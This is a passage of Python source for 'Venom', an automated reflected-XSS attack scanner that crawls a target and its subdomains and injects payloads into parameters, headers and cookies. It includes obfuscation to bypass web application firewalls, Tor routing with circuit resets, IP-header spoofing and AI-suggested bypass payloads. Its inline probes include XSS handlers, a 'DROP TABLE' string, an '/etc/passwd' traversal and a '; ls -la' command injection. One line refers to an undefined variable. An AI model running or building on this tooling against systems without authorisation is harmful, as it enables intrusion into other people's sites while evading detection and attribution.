        if self.bypass_needed or self.use_403_bypass:
            waf_specific = bypass_payloads.get(self.waf_type, [])
            payloads.update(waf_specific)
            logging.info(f"Loaded WAF-specific bypass payloads for {self.waf_type}: {len(waf_specific)}")

        if self.payload_file:
            file_path = sanitize_path(self.payload_file)
            try:
                if os.path.exists(file_path) and os.access(file_path, os.R_OK):
                    with open(file_path, 'r', encoding='utf-8') as f:
                        file_payloads = [sanitize_input(line.strip()) for line in f if line.strip()]
                        payloads.update(file_payloads)
                        logging.info(f"Loaded {len(file_payloads)} payloads from {file_path}")
                else:
                    logging.error(f"Payload file {file_path} not found or not readable; using defaults")
            except Exception as e:
                logging.error(f"Error loading {file_path}: {e}; using defaults")
        else:
            if not os.path.exists(self.payloads_dir) or not os.access(self.payloads_dir, os.R_OK):
                logging.error(f"Payloads directory {self.payloads_dir} not found or not readable; using defaults")
                return list(payloads)

            all_files = [f for f in os.listdir(self.payloads_dir) if f.endswith('.txt')]
            if not all_files:
                logging.warning(f"No .txt files found in {self.payloads_dir}; using defaults")
                return list(payloads)

            loaded_any = False
            if self.use_403_bypass or self.bypass_needed:
                bypass_file = '403bypass.txt' if self.use_403_bypass else 'waf_bypass.txt'
                file_path = os.path.join(self.payloads_dir, bypass_file)
                try:
                    if os.path.exists(file_path) and os.access(file_path, os.R_OK):
                        with open(file_path, 'r', encoding='utf-8') as f:
                            file_payloads = [sanitize_input(line.strip()) for line in f if line.strip()]
                            payloads.update(file_payloads)
                            logging.info(f"Loaded {len(file_payloads)} payloads from {file_path} for bypass")
                            loaded_any = True
                except Exception as e:
                    logging.error(f"Error loading {file_path}: {e}")

            for filename in all_files:
                file_path = os.path.join(self.payloads_dir, filename)
                try:
                    if os.path.exists(file_path) and os.access(file_path, os.R_OK):
                        with open(file_path, 'r', encoding='utf-8') as f:
                            file_payloads = [sanitize_input(line.strip()) for line in f if line.strip()]
                            payloads.update(file_payloads)
                            logging.info(f"Loaded {len(file_payloads)} payloads from {file_path}")
                            loaded_any = True
                except Exception as e:
                    logging.error(f"Error loading {file_path}: {e}")

            if not loaded_any:
                logging.error(f"No payload files loaded from {self.payloads_dir}; using defaults")

        if self.extended_events:
            payloads.update([
                "<img src=x onmouseover=alert('xss')>",
                "<div onclick=alert('xss')>Click</div>",
                "<input onfocus=alert('xss')>"
            ])
        logging.debug(f"Total unique payloads loaded: {len(payloads)}")
        return list(payloads)

    def generate(self) -> List[str]:
        payloads = self.payloads
        if self.bypass_needed or self.bypass_sandbox or self.bypass_sanitizer:
            payloads = self.obfuscate_payloads(payloads)
        return payloads

    def obfuscate_payloads(self, payloads: List[str]) -> List[str]:
        obfuscated = []
        for p in payloads:
            obfuscated.extend([
                p.upper(),
                html.escape(p),
                f"/*{random.randint(1,100)}*/{p}/*{random.randint(1,100)}*/",
                urlencode({'': p})[1:],
                ''.join(f"&#{ord(c)};" for c in p),
                p.replace('script', 'scr' + 'ipt'),
                f"javascript:{p}" if not p.startswith('javascript:') else p,
            ])
        return list(set(obfuscated))

    def update_success(self, payload: str):
        self.previous_success.append(payload)

# Start of Part 4
class Venom:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.session = requests.Session()
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['8.8.8.8', '8.8.4.4', '1.1.1.1']
        retry_strategy = Retry(total=10, backoff_factor=2, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=["HEAD", "GET", "POST"])
        self.session.mount('http://', HTTPAdapter(max_retries=retry_strategy, pool_maxsize=20))
        self.session.mount('https://', HTTPAdapter(max_retries=retry_strategy, pool_maxsize=20))
        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://example.com',  # Default Referer for testing
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'Origin': 'https://example.com',
            'X-Requested-With': 'XMLHttpRequest'
        })

        self.proxies = None
        if args.use_tor:
            setup_tor_proxy()
            try:
                tor_response = self.session.get("https://check.torproject.org", timeout=5)
                if "Congratulations" not in tor_response.text:
                    logging.error("Tor connection not verified")
                    print(f"{RED}[!] Tor connection not working. Check Tor service on port 9050.{RESET}")
                    sys.exit(1)
                logging.info("Tor connection verified")
            except RequestException as e:
                logging.error(f"Failed to verify Tor: {e}")
                print(f"{RED}[!] Unable to verify Tor connection: {e}. Exiting.{RESET}")
                sys.exit(1)
        elif args.proxy:
            self.proxies = setup_custom_proxy(args.proxy)
            self.session.proxies.update(self.proxies)

        if args.anonymous:
            self.session.headers.pop('Referer', None)
            self.session.headers.pop('User-Agent', None)
            self.session.headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)'
            ])

        if args.disable_ssl_verify:
            import urllib3
            urllib3.disable_warnings()
            self.session.verify = False

        self.update_headers(args.headers)
        self.post_data = args.post_data if hasattr(args, 'post_data') else {'test': 'default'}
        if args.data:
            self.post_data.update(dict(pair.split('=', 1) for pair in args.data.split('&')))

        if args.new_session:
            self.session.cookies.clear()
            self.vulnerabilities = []
            self.visited_urls = set()
            logging.info("New session created")

        self.task_queue = queue.Queue()
        self.lock = threading.Lock()
        self.vulnerabilities = [] if not hasattr(self, 'vulnerabilities') else self.vulnerabilities
        self.visited_urls = set() if not hasattr(self, 'visited_urls') else self.visited_urls
        self.total_tests = ThreadSafeCounter()
        self.total_payloads = 0
        self.current_payload = "Initializing..."
        self.current_param = "None"
        self.current_method = "None"
        self.current_cookie = "None"
        self.start_time = time.time()
        self.last_display_time = 0
        self.running = True
        self.domain = urlparse(args.url).netloc
        self.waf_ips_status = "Unknown"
        self.waf_type = "Unknown"
        self.bypass_performed = False
        self.use_403_bypass = args.use_403_bypass
        self.is_waf_detected = False
        self.active_params = []
        # Expanded extra_params with new general parameters, JS candidates, and metadata
        self.extra_params = args.extra_params.split(',') if args.extra_params else [
            'q', 's', 'search', 'query', 'id', 'name', 'title', 'msg', 'message', 'comment', 'text', 'content',
            'input', 'email', 'username', 'user', 'page', 'redirect', 'url', 'lang', 'locale', 'next', 'return',
            'callback', 'cb', 'jsonp', 'onload', 'onerror', 'onclick', 'onmouseover', 'src', 'href', 'style',
            'data', 'html', 'desc', 'description', 'meta', 'keywords', 'tooltip', 'label', 'placeholder', 'img',
            'image', 'avatar', 'icon'
        ]
        self.subdomains = self.load_subdomains() if args.subdomains else []
        self.rate_limit_detected = False
        self.dns_failure_count = 0
        self.dns_cache = {}
        self.live_subdomains = []
        self.forbidden_subdomains = []
        self.test_headers = ['Referer', 'User-Agent', 'X-Forwarded-For', 'Host', 'X-Real-IP', 'Origin', 'Accept-Language', 'X-Requested-With']
        self.test_cookies = ['session', 'token', 'user', 'id', 'callback']

        self.initial_waf_ips_check()
        self.payload_generator = PayloadGenerator(
            self.args.payloads_dir, self.args.payload_file, self.bypass_performed, 
            self.use_403_bypass, self.args.stealth, self.args.extended_events, 
            self.waf_type, self.args.bypass_sandbox, self.args.bypass_sanitizer
        )
        self.payloads = self.payload_generator.generate()
        self.ai_assistant = AIAssistant(
            self.payloads, self.args.ai_key, self.args.ai_platform, 
            self.args.extended_events, self.args.bypass_sandbox, self.args.bypass_sanitizer,
            self.args.llm_prompt_wiz
        ) if args.ai_assist or args.llm_prompt_wiz else None
        if self.ai_assistant:
            self.payloads = self.ai_assistant.suggest_payloads(waf_detected=self.is_waf_detected, waf_type=self.waf_type)
        self.total_payloads = len(self.payloads)

        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        print(f"{YELLOW}[!] Scan interrupted by user. Generating report...{RESET}")
        self.running = False
        self.generate_report()
        sys.exit(0)

    def load_subdomains(self) -> List[str]:
        subdomains = []
        try:
            with open(self.args.subdomains, 'r', encoding='utf-8') as f:
                for line in f:
                    subdomain = line.strip()
                    if subdomain:
                        if subdomain.startswith(('http://', 'https://')):
                            subdomains.append(subdomain)
                        else:
                            subdomains.append(f"http://{subdomain}.{self.domain}")
                            subdomains.append(f"https://{subdomain}.{self.domain}")
            logging.info(f"Loaded {len(subdomains)} subdomains from {self.args.subdomains}")
            return subdomains
        except Exception as e:
            logging.error(f"Failed to load subdomains from {self.args.subdomains}: {e}")
            return []

    def update_headers(self, headers: List[str]) -> None:
        if not headers:
            return
        for header in headers:
            try:
                key, value = header.split(':', 1)
                sanitized_key = sanitize_input(key.strip())
                sanitized_value = sanitize_input(value.strip())
                self.session.headers.update({sanitized_key: sanitized_value})
                logging.info(f"Custom header added")
            except ValueError:
                logging.warning(f"Invalid header format")

    def resolve_with_fallback(self, hostname: str) -> Optional[str]:
        if hostname in self.dns_cache:
            return self.dns_cache[hostname]
        
        retries = 5
        for attempt in range(retries):
            try:
                ip = socket.gethostbyname(hostname)
                self.dns_cache[hostname] = ip
                logging.debug(f"Resolved {hostname} with system DNS: {ip}")
                return ip
            except socket.gaierror as e:
                logging.warning(f"DNS resolution failed for {hostname} with system DNS (attempt {attempt + 1}/{retries}): {e}")
                resolver = dns.resolver.Resolver()
                resolver.nameservers = ['8.8.8.8', '8.8.4.4', '1.1.1.1']
                try:
                    answer = resolver.resolve(hostname, 'A')
                    ip = answer[0].address
                    self.dns_cache[hostname] = ip
                    logging.info(f"Resolved {hostname} with fallback DNS: {ip}")
                    return ip
                except Exception as e:
                    logging.error(f"Failed to resolve {hostname} with fallback DNS (attempt {attempt + 1}/{retries}): {e}")
                    if self.args.use_tor:
                        reset_tor_circuit()
                    time.sleep(2)
        logging.error(f"All DNS resolution attempts failed for {hostname}")
        return None

    def check_connection(self, url: str) -> bool:
        retries = 10
        for attempt in range(retries):
            try:
                response = self.session.head(url, timeout=self.args.timeout, allow_redirects=True)
                logging.debug(f"Connection check for {url}: {response.status_code}")
                self.dns_failure_count = 0
                return response.status_code < 400 or response.status_code == 403
            except ConnectionError as e:
                logging.error(f"Connection refused for {url}: {e}")
                print(f"{RED}[!] Connection refused for {url}: {e}. Retrying ({attempt + 1}/{retries})...{RESET}")
            except RequestException as e:
                if "NameResolutionError" in str(e):
                    self.dns_failure_count += 1
                    logging.error(f"DNS resolution failed for {url}: {e}")
                    if self.dns_failure_count > 5:
                        print(f"{YELLOW}[!] Multiple DNS resolution failures ({self.dns_failure_count}). Resetting Tor circuit and retrying ({attempt + 1}/{retries})...{RESET}")
                        if self.args.use_tor:
                            reset_tor_circuit()
                else:
                    logging.error(f"Connection check for {url}: {e}")
                time.sleep(2)
        print(f"{RED}[!] Failed to connect to {url} after {retries} attempts.{RESET}")
        return False

    def initial_waf_ips_check(self):
        waf_signatures = {
            "Cloudflare": ["cloudflare", "CF-RAY", "cf-cache-status"],
            "AWS WAF": ["X-Amz-Cf-Id", "X-Amz-Cf-Pop"],
            "ModSecurity": ["Mod_Security", "X-Mod-Security"],
            "Imperva": ["X-Iinfo", "X-Cdn: Imperva"],
            "Akamai": ["X-Akamai-Transformed", "AkamaiGHost"]
        }
        test_payloads = [
            "<script>alert('xss')</script>",
            "1; DROP TABLE users--",
            "../../etc/passwd",
            "; ls -la"
        ]
        self.waf_ips_status = "No WAF/IPS detected"
        self.is_waf_detected = False
        self.waf_type = "Unknown"

        try:
            for payload in test_payloads:
                url = self.args.url + "?test=" + urlencode({'': payload})[1:]
                response = self.session.get(url, timeout=self.args.timeout)
                headers = response.headers
                content = response.text.lower()

                for waf, signatures in waf_signatures.items():
                    if any(sig.lower() in headers.get(k, "").lower() for k in headers for sig in signatures):
                        self.waf_ips_status = f"WAF detected: {waf}"
                        self.is_waf_detected = True
                        self.waf_type = waf
                        logging.info(f"WAF detected: {waf}")
                        break

                if response.status_code in [403, 429] or any(kw in content for kw in ["blocked", "access denied", "forbidden", "request blocked"]):
                    self.waf_ips_status = "WAF/IPS detected (status/content)"
                    self.is_waf_detected = True
                    self.waf_type = "Generic" if self.waf_type == "Unknown" else self.waf_type

                if "<script" in content and any(kw in content for kw in ["eval", "setTimeout", "challenge"]):
                    self.waf_ips_status = "WAF detected: JS Challenge"
                    self.is_waf_detected = True
                    self.waf_type = "JS-Based"

            for _ in range(5):
                response = self.session.get(self.args.url, timeout=self.args.timeout)
                if response.status_code == 429:
                    self.waf_ips_status = "WAF/IPS detected: Rate Limiting"
                    self.is_waf_detected = True
                    self.rate_limit_detected = True
                    self.waf_type = "Rate-Limiter"
                    break
                time.sleep(0.2)

            logging.info(f"WAF/IPS check result: {self.waf_ips_status} (Type: {self.waf_type})")
        except Exception as e:
            logging.error(f"Unexpected error in WAF check: {e}")
            self.waf_ips_status = "Check failed"
            print(f"{RED}[!] WAF/IPS check failed unexpectedly: {e}. Proceeding with scan attempt.{RESET}")

    def crawl_links(self, base_url: str) -> List[str]:
        urls = set([base_url])
        if not self.check_connection(base_url):
            logging.error(f"Base URL {base_url} not reachable")
            return list(urls)
        
        try:
            response = self.session.get(base_url, timeout=self.args.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                absolute_url = urljoin(base_url, link['href'])
                parsed = urlparse(absolute_url)
                if parsed.netloc == self.domain and absolute_url not in self.visited_urls:
                    urls.add(absolute_url)
                    self.task_queue.put((absolute_url, 'get', {}))
            for form in soup.find_all('form'):
                action = form.get('action')
                if action:
                    absolute_url = urljoin(base_url, action)
                    if urlparse(absolute_url).netloc == self.domain and absolute_url not in self.visited_urls:
                        urls.add(absolute_url)
                        method = form.get('method', 'get').lower()
                        self.task_queue.put((absolute_url, method, self.extract_form_data(form)))
            # Check for JSONP endpoints
            for script in soup.find_all('script', src=True):
                src = script['src']
                if 'callback=' in src or 'cb=' in src or 'jsonp=' in src:
                    absolute_url = urljoin(base_url, src)
                    if urlparse(absolute_url).netloc == self.domain and absolute_url not in self.visited_urls:
                        urls.add(absolute_url)
                        self.task_queue.put((absolute_url, 'get', {}))
            logging.info(f"Crawled {len(urls)} URLs from {base_url}")
        except RequestException as e:
            logging.error(f"Crawl failed for {base_url}: {e}")
        return list(urls)

    def extract_form_data(self, form: BeautifulSoup) -> Dict[str, str]:
        data = {}
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            name = input_tag.get('name')
            if name:
                value = input_tag.get('value', 'test')
                data[sanitize_input(name)] = sanitize_input(value)
        return data

    def extract_params(self, url: str, response_text: str) -> List[str]:
        params = set(parse_qs(urlparse(url).query).keys())
        soup = BeautifulSoup(response_text, 'html.parser')
        # Extract parameters from HTML tags
        for tag in soup.find_all(['input', 'textarea', 'select', 'button', 'a', 'meta', 'img']):
            if tag.get('name'):
                params.add(tag['name'])
            if tag.get('id'):
                params.add(tag['id'])
            if tag.name == 'a' and 'href' in tag.attrs:
                href_params = parse_qs(urlparse(tag['href']).query).keys()
                params.update(href_params)
            if tag.name == 'meta' and 'name' in tag.attrs:
                params.add(tag['name'])
            for attr in ['desc', 'description', 'keywords', 'tooltip', 'label', 'placeholder', 'image', 'avatar', 'icon']:
                if tag.get(attr):
                    params.add(attr)
        # Extract parameters from script tags (e.g., JSONP, DOM manipulation)
        for script in soup.find_all('script'):
            script_text = script.get_text()
            for param in ['callback', 'cb', 'jsonp']:
                if param in script_text:
                    params.add(param)
        if self.args.all_params:
            for tag in soup.find_all(True):
                for attr in tag.attrs:
                    if attr in ['name', 'id', 'data-name', 'class', 'onload', 'onerror', 'onclick', 'onmouseover',
                                'src', 'href', 'style', 'data', 'html']:
                        value = tag[attr]
                        if isinstance(value, list):
                            params.update(str(v) for v in value)
                        else:
                            params.add(str(value))
        # Add extra parameters
        for extra_param in self.extra_params:
            params.add(extra_param)
        # Add URL fragment parameters
        parsed_url = urlparse(url)
        if parsed_url.fragment:
            fragment_params = parse_qs(parsed_url.fragment)
            params.update(fragment_params.keys())
        self.active_params = list(params)
        logging.debug(f"Extracted {len(self.active_params)} parameters from {url}: {self.active_params}")
        return self.active_params

    def inject_payload(self, url: str, method: str, payload: str, param: str = None, data: Dict[str, str] = None,
                      header: str = None, cookie: str = None) -> tuple[Optional[str], int]:
        retries = 10
        response_text = None
        status_code = 0
        for attempt in range(retries):
            try:
                headers = self.session.headers.copy()
                cookies = self.session.cookies.get_dict().copy()
                if header:
                    headers[header] = payload
                    logging.debug(f"Injecting payload '{payload}' into header {header}")
                if cookie:
                    cookies[cookie] = payload
                    logging.debug(f"Injecting payload '{payload}' into cookie {cookie}")
                if method.lower() == 'get':
                    target_url = url
                    if param:
                        parsed = urlparse(url)
                        query = parse_qs(parsed.query)
                        query[param] = payload
                        target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
                    response = self.session.get(target_url, headers=headers, cookies=cookies, timeout=self.args.timeout)
                else:
                    data = data.copy() if data else self.post_data.copy()
                    if param:
                        data[param] = payload
                    response = self.session.post(url, data=data, headers=headers, cookies=cookies, timeout=self.args.timeout)
                logging.debug(f"Injected payload '{payload}' into {url} ({method}) - Status: {response.status_code}")
                if response.status_code in [403, 429] and not self.is_waf_detected:
                    self.is_waf_detected = True
                    self.waf_ips_status = f"WAF/IPS detected during scan (status: {response.status_code})"
                    self.waf_type = "Dynamic Detection"
                    logging.info(f"WAF/IPS detected during scan: {self.waf_ips_status}")
                    if self.use_403_bypass:
                        self.bypass_performed = True
                        self.payloads = self.payload_generator.generate()
                        logging.info("Switched to 403 bypass payloads")
                    elif self.ai_assistant:
                        self.payloads = self.ai_assistant.suggest_payloads(response.text, response.status_code, True, self.waf_type)
                response_text = response.text
                status_code = response.status_code
                self.dns_failure_count = 0
                return response_text, status_code
            except RequestException as e:
                if "NameResolutionError" in str(e) or "RemoteDisconnected" in str(e):
                    self.dns_failure_count += 1
                    logging.error(f"Payload injection failed for {url}: {e}")
                    if self.dns_failure_count > 5:
                        print(f"{YELLOW}[!] Multiple DNS resolution failures ({self.dns_failure_count}). Resetting Tor circuit and retrying ({attempt + 1}/{retries})...{RESET}")
                        if self.args.use_tor:
                            reset_tor_circuit()
                else:
                    logging.error(f"Payload injection failed for {url}: {e}")
                time.sleep(2)
        logging.error(f"Payload injection failed for {url} after {retries} attempts")
        return response_text, status_code

    def scan_url(self, url: str, method: str, data: Dict[str, str]):
        if url in self.visited_urls:
            logging.debug(f"Skipping already visited URL: {url}")
            return
        self.visited_urls.add(url)
        
        try:
            response = self.session.get(url, timeout=self.args.timeout) if method.lower() == 'get' else \
                      self.session.post(url, data=data, timeout=self.args.timeout)
            params = self.extract_params(url, response.text)
            if not params and method.lower() == 'post':
                params = list(data.keys())
            
            payloads = self.ai_assistant.suggest_payloads(response.text, response.status_code, self.is_waf_detected, self.waf_type) if self.ai_assistant else self.payload_generator.generate()
            
            def test_payload(param, payload, header=None, cookie=None):
                self.current_payload = payload
                self.current_param = param if param else (header if header else cookie)
                self.current_method = method.upper()
                self.current_cookie = "Hidden" if self.args.anonymous else str(self.session.cookies.get_dict())
                resp_text, status = self.inject_payload(url, method, payload, param, data, header, cookie)
                test_count = self.total_tests.increment()
                
                if status == 429 and not self.rate_limit_detected:
                    self.rate_limit_detected = True
                    self.args.min_delay *= 1.5
                    self.args.max_delay *= 1.5
                    logging.info(f"Rate limit detected, increased delays to {self.args.min_delay}-{self.args.max_delay}s")
                    if self.args.use_tor:
                        reset_tor_circuit()

                if resp_text and status == 200:
                    soup = BeautifulSoup(resp_text, 'html.parser')
                    reflected, context = is_reflected(payload, resp_text, soup)
                    if reflected:
                        logging.debug(f"Payload {payload} reflected in {url} - Context: {context}")
                        start_idx = resp_text.find(payload) if payload in resp_text else -1
                        snippet = resp_text[max(0, start_idx-50):start_idx+len(payload)+50] if start_idx != -1 else "Not found in full text"
                        vuln = {
                            'url': url,
                            'full_url': url + '?' + urlencode({param: payload}) if method.lower() == 'get' and param else url,
                            'method': method.upper(),
                            'param': param if param else (header if header else cookie),
                            'location': 'query' if param else ('header' if header else 'cookie'),
                            'payload': payload,
                            'type': "Reflected XSS",
                            'context': context,
                            'response_snippet': snippet,
                            'status_code': status
                        }
                        with self.lock:
                            self.vulnerabilities.append(vuln)
                        logging.info(f"Vulnerability found at {url} - Param: {param or header or cookie} - Payload: {payload} - Context: {context}")
                        if self.ai_assistant:
                            self.ai_assistant.record_success(payload, resp_text[:500], status)
                
                time.sleep(random.uniform(self.args.min_delay, self.args.max_delay))

            with ThreadPoolExecutor(max_workers=min(10, self.args.workers)) as executor:
                futures = []
                # Test query and POST parameters
                for param in params:
                    for payload in payloads[:50]:
                        futures.append(executor.submit(test_payload, param, payload))
                # Test headers
                for header in self.test_headers:
                    for payload in payloads[:50]:
                        futures.append(executor.submit(test_payload, None, payload, header=header))
                # Test cookies
                for cookie in self.test_cookies:
                    for payload in payloads[:50]:
                        futures.append(executor.submit(test_payload, None, payload, cookie=cookie))
                for future in futures:
                    try:
                        future.result()
                    except Exception as e:
                        logging.error(f"Payload test failed: {e}")

        except RequestException as e:
            logging.error(f"Scan failed for {url}: {e}")
            print(f"{YELLOW}[!] Skipping {url} due to error: {e}. Continuing with remaining tasks.{RESET}")

    def worker(self):
        while self.running:
            try:
                url, method, data = self.task_queue.get(timeout=5)
                logging.debug(f"Worker processing: {method} {url}")
                self.scan_url(url, method, data)
                self.task_queue.task_done()
                logging.info(f"Completed task: {method} {url} (Remaining tasks: {self.task_queue.qsize()})")
            except queue.Empty:
                logging.debug("Task queue empty, worker exiting")
                break
            except Exception as e:
                logging.error(f"Worker error: {e}")
                try:
                    self.task_queue.task_done()
                except ValueError:
                    pass
                if self.args.use_tor and "NameResolutionError" in str(e):
                    reset_tor_circuit()

    def display_status(self):
        while self.running:
            current_time = time.time()
            if current_time - self.last_display_time >= 1 and not self.args.no_live_status:
                elapsed = current_time - self.start_time
                tests_per_sec = self.total_tests.get() / elapsed if elapsed > 0 else 0
                llm_status = "Active" if self.args.llm_prompt_wiz else "Inactive"
                status = f"""
{BLUE}╔════ Venom Live Status @ {time.strftime('%H:%M:%S')} ═════════════════════════════════════╗{RESET}
{BLUE}║{RESET} Tests Run: {YELLOW}{self.total_tests.get():>5}{RESET} | Payloads: {YELLOW}{self.total_payloads}{RESET} | Vulns: {RED}{len(self.vulnerabilities)}{RESET} | Speed: {GREEN}{tests_per_sec:.2f} t/s{RESET}
{BLUE}║{RESET} Current: {CYAN}{self.current_method} {self.current_param}={self.current_payload}{RESET}
{BLUE}║{RESET} Cookies: {WHITE}{self.current_cookie}{RESET}
{BLUE}║{RESET} WAF/IPS: {ORANGE}{self.waf_ips_status} ({self.waf_type}){RESET} | LLM Prompt-Wiz: {GREEN}{llm_status}{RESET}
{BLUE}║{RESET} Workers: {PURPLE}{self.args.workers}{RESET} | Domain: {WHITE}{self.domain}{RESET} | DNS Fails: {YELLOW}{self.dns_failure_count}{RESET}
{BLUE}╚════════════════════════════════════════════════════════════════════════════════════╝{RESET}
"""
                print(status, end='\r' if os.name == 'nt' else '')
                self.last_display_time = current_time
            time.sleep(0.1)

    def run(self):
        dns_retries = 5
        ip = None
        for attempt in range(dns_retries):
            ip = self.resolve_with_fallback(self.domain)
            if ip:
                print(f"{GREEN}[+] DNS resolution successful for {self.domain} on attempt {attempt + 1} (IP: {ip}).{RESET}")
                break
            else:
                print(f"{YELLOW}[!] DNS resolution failed for {self.domain} on attempt {attempt + 1}/{dns_retries}. Retrying...{RESET}")
                if self.args.use_tor:
                    reset_tor_circuit()
                time.sleep(2)
        else:
            print(f"{RED}[!] All DNS resolution attempts failed for {self.domain}. Exiting.{RESET}")
            sys.exit(1)

        if not self.check_connection(self.args.url):
            print(f"{RED}[!] Target URL {self.args.url} unreachable after retries. Attempting scan anyway.{RESET}")
        
        urls = self.crawl_links(self.args.url)
        logging.info(f"Initial crawl found {len(urls)} URLs")
        if self.subdomains:
            for subdomain in self.subdomains:
                try:
                    response = self.session.head(subdomain, timeout=self.args.timeout, allow_redirects=True)
                    if response.status_code < 400:
                        self.live_subdomains.append(subdomain)
                        urls.extend(self.crawl_links(subdomain))
                        logging.info(f"Live subdomain (status {response.status_code}): {subdomain}")
                    elif response.status_code == 403:
                        self.forbidden_subdomains.append(subdomain)
                        urls.extend(self.crawl_links(subdomain))
                        logging.info(f"Forbidden subdomain (status 403): {subdomain}")
                    else:
                        logging.warning(f"Subdomain {subdomain} unreachable (status {response.status_code}), skipping")
                except RequestException as e:
                    logging.warning(f"Subdomain {subdomain} unreachable: {e}")
            print(f"{GREEN}[+] Live subdomains (200-399): {len(self.live_subdomains)} | Forbidden subdomains (403): {len(self.forbidden_subdomains)}{RESET}")

        if self.args.method in ['get', 'both']:
            self.task_queue.put((self.args.url, 'get', {}))
            logging.debug(f"Queued GET task for {self.args.url}")
        if self.args.method in ['post', 'both']:
            self.task_queue.put((self.args.url, 'post', self.post_data))
            logging.debug(f"Queued POST task for {self.args.url}")

        for url in urls:
            if self.args.method in ['get', 'both']:
                self.task_queue.put((url, 'get', {}))
                logging.debug(f"Queued GET task for {url}")
            if self.args.method in ['post', 'both']:
                self.task_queue.put((url, 'post', self.post_data))
                logging.debug(f"Queued POST task for {url}")

        logging.info(f"Task queue populated with {self.task_queue.qsize()} tasks")
        print(f"{GREEN}[+] Starting scan with {self.task_queue.qsize()} tasks queued{RESET}")
        
        status_thread = threading.Thread(target=self.display_status)
        status_thread.daemon = True
        status_thread.start()

        workers = []
        for _ in range(self.args.workers):
            worker_thread = threading.Thread(target=self.worker)
            worker_thread.daemon = True
            worker_thread.start()
            workers.append(worker_thread)

        self.task_queue.join()
        self.running = False
        
        for worker in workers:
            worker.join()
        status_thread.join()

        self.generate_report()

    def generate_report(self):
        print(f"\n{GREEN}╔════ Venom Scan Report @ {time.strftime('%Y-%m-%d %H:%M:%S')} ═════════════════════╗{RESET}")
        print(f"{GREEN}║{RESET} Target: {WHITE}{self.args.url}{RESET}")
        print(f"{GREEN}║{RESET} Total Tests: {YELLOW}{self.total_tests.get()}{RESET} | Payloads: {YELLOW}{self.total_payloads}{RESET} | Duration: {CYAN}{time.time() - self.start_time:.2f}s{RESET}")
        print(f"{GREEN}║{RESET} Subdomains Scanned: {YELLOW}{len(self.live_subdomains) + len(self.forbidden_subdomains)}{RESET} | Live (200-399): {GREEN}{len(self.live_subdomains)}{RESET} | Forbidden (403): {ORANGE}{len(self.forbidden_subdomains)}{RESET}")
        print(f"{GREEN}║{RESET} Vulnerabilities Found: {RED}{len(self.vulnerabilities)}{RESET}")
        if self.vulnerabilities:
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{GREEN}║{RESET} {i}. {RED}{vuln['type']}{RESET}")
                print(f"{GREEN}║{RESET}    URL: {WHITE}{vuln['url']}{RESET}")
                print(f"{GREEN}║{RESET}    Full URL: {WHITE}{vuln['full_url']}{RESET}")
                print(f"{GREEN}║{RESET}    Method: {CYAN}{vuln['method']}{RESET}")
                print(f"{GREEN}║{RESET}    Parameter: {YELLOW}{vuln['param']}{RESET}")
                print(f"{GREEN}║{RESET}    Location: {YELLOW}{vuln['location']}{RESET}")
                print(f"{GREEN}║{RESET}    Payload: {PURPLE}{vuln['payload']}{RESET}")
                print(f"{GREEN}║{RESET}    Context: {ORANGE}{vuln['context']}{RESET}")
                print(f"{GREEN}║{RESET}    Status Code: {YELLOW}{vuln['status_code']}{RESET}")
                print(f"{GREEN}║{RESET}    Response Snippet: {WHITE}{vuln['response_snippet']}{RESET}")
        else:
            print(f"{GREEN}║{RESET}    {GREEN}No vulnerabilities detected.{RESET}")
        print(f"{GREEN}╚════════════════════════════════════════════════════════════════════╝{RESET}")

        if self.args.export_report:
            self.export_report(self.args.export_report)

    def export_report(self, filename: str):
        try:
            if filename.endswith('.json'):
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump({
                        'target': self.args.url,
                        'total_tests': self.total_tests.get(),
                        'total_payloads': self.total_payloads,
                        'duration': time.time() - self.start_time,
                        'subdomains': {
                            'live': self.live_subdomains,
                            'forbidden': self.forbidden_subdomains
                        },
                        'vulnerabilities': self.vulnerabilities
                    }, f, indent=4, ensure_ascii=False)
            elif filename.endswith('.csv'):
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("URL,Full URL,Method,Parameter,Location,Payload,Type,Context,Status Code,Response Snippet\n")
                    for vuln in self.vulnerabilities:
                        f.write(f"{vuln['url']},{vuln['full_url']},{vuln['method']},{vuln['param']},{vuln['location']},\"{vuln['payload']}\",{vuln['type']},{vuln['context']},{vuln['status_code']},\"{vuln['response_snippet']}\"\n")
            logging.info(f"Report exported to {filename}")
        except Exception as e:
            logging.error(f"Failed to export report to {filename}: {e}")

def is_reflected(payload: str, response_text: str, soup: BeautifulSoup) -> tuple[bool, str]:
    if not payload.strip():
        return False, "Empty payload"

    if payload in response_text and html.escape(payload) != payload:
        script_tags = soup.find_all('script')
        for script in script_tags:
            script_text = script.get_text()
            if payload in script_text and not script.get('src'):
                return True, "Inside <script> tag (executable)"
            # Check for high-risk patterns
            if any(func in script_text.lower() for func in ['eval(', 'settimeout(', 'innerhtml', 'document.write(']):
                return True, f"Inside <script> tag with high-risk pattern ({func})"

        for tag in soup.find_all(True):
            for attr, value in tag.attrs.items():
                if attr.startswith('on') and payload in str(value):
                    return True, f"Inside event handler ({attr})"
